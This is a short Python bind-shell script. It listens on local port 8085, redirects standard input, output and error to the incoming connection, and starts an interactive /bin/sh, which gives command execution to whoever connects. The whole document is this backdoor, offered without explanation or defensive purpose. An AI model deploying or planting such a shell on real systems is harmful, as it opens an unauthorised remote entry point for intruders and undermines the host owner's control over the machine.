import sys
import os
import subprocess
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("127.0.0.1", 8085))
s.listen(1)
conn, data = s.accept()
while 1: 	
	#duplicate stdin, stdout and stderr on the conn socket's fd
	os.dup2(conn.fileno(), 0)
	os.dup2(conn.fileno(), 1)
	os.dup2(conn.fileno(), 2)
	os.system('/bin/sh -i')

conn.close()

		 	
